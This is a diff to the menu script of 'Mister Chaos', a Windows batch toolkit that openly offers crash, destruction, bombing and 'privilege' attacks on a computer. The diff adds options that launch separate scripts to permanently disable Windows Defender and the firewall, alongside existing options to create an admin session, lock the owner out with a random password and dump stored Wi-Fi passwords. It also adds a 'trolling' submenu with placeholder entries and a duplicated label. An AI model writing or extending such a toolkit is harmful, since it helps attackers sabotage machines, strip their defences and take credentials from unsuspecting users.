@@ -13,9 +13,10 @@ echo  #               Mister Chaos               #
 echo  [==========================================]
 echo  #  1. Bombing Attacks                      #
 echo  #  2. Crash Attacks                        #
-echo  #  3. Privilage Escalation                 #
+echo  #  3. Privilage Attacks                    #
 echo  #  4. Destruction Attacks                  #
 echo  #  5. Permanent Crash Attacks              #
+echo  #  6. Trolling Attacks                     #
 echo  #  q. (EXIT)                               #
 echo  [==========================================] 
 echo                               By Webious_ (c)
@@ -28,6 +29,7 @@ if %selectmenu% == 2 goto menu_crash
 if %selectmenu% == 3 goto menu_privilage
 if %selectmenu% == 4 goto menu_destruction
 if %selectmenu% == 5 goto menu_permacrash
+if %selectmenu% == 6 goto menu_trolling
 if %selectmenu% == q goto exit
 ) else (
 goto menu
@@ -153,6 +155,8 @@ echo  [==========================================]
 echo  #  1. New Admin Session                    #
 echo  #  2. Lock out with random Password        #
 echo  #  3. Get all Wifi Password                #
+echo  #  4. Disable WinDefender (PERMA)          #
+echo  #  5. Disable Firewall (PERMA)             #
 echo  #  m. (Back to Main Menu)                  #
 echo  [==========================================] 
 echo.
@@ -163,6 +167,8 @@ set /p SelectMenu_Privilage=
 if %SelectMenu_Privilage% == 1 goto admin_privilage
 if %SelectMenu_Privilage% == 2 goto passrandom_privilage
 if %SelectMenu_Privilage% == 3 goto getwifi_privilage
+if %SelectMenu_Privilage% == 4 goto windefender_privilage
+if %SelectMenu_Privilage% == 5 goto firewalldis_privilage
 if %SelectMenu_Privilage% == m goto menu
 ) else (
 goto menu_privilage
@@ -183,6 +189,18 @@ goto menu_privilage
 REM GETWIFI_PRIVILAGE
 :getwifi_privilage
 start getwifi_privilage.bat
+pause
+goto menu_privilage
+
+REM WIDEFENDER_PRIVILAGE
+:windefender_privilage
+start windefender_privilage.bat
+pause
+goto menu_privilage
+
+REM FIREWALLDIS_PRIVILAGE
+:firewalldis_privilage
+start firewalldis_privilage.bat
 pause
 goto menu_privilage
 REM ==================================================================================================
@@ -284,7 +302,51 @@ REM PORN_PERMACRASH
 :explorer_permacrash
 start explorer_permacrash.bat
 pause
-goto menu_crash
+goto menu_permacrash
+REM ==================================================================================================
+
+REM MENU_TROLLING_6
+REM ==================================================================================================
+:menu_trolling
+color 0D
+cls
+echo.
+echo  [==========================================]
+echo  #              Trolling Attacks            #
+echo  [==========================================]
+echo  #  1. Wallpaper Changer                    #
+echo  #  2.                                      #
+echo  #  3.                                      #
+echo  #  m. (Back to Main Menu)                  #
+echo  [==========================================] 
+echo.
+echo   Enter Selection_
+
+REM SelectMenu_Permacrash
+set /p SelectMenu_Permacrash=
+if %SelectMenu_Permacrash% == 1 goto wallpaper_trolling
+if %SelectMenu_Permacrash% == 2 goto _trolling
+if %SelectMenu_Permacrash% == 3 goto _trolling
+if %SelectMenu_Permacrash% == m goto menu
+) else (
+goto menu_trolling
+)
+
+REM WALLPAPER_TROLLING
+:wallpaper_trolling
+start wallpaper_trolling.bat
+pause
+goto menu_trolling
+
+REM _TROLLING
+:_trolling 
+pause
+goto menu_trolling
+
+REM _TROLLING
+:_trolling
+pause
+goto menu_trolling
 REM ==================================================================================================
 
 REM EXIT
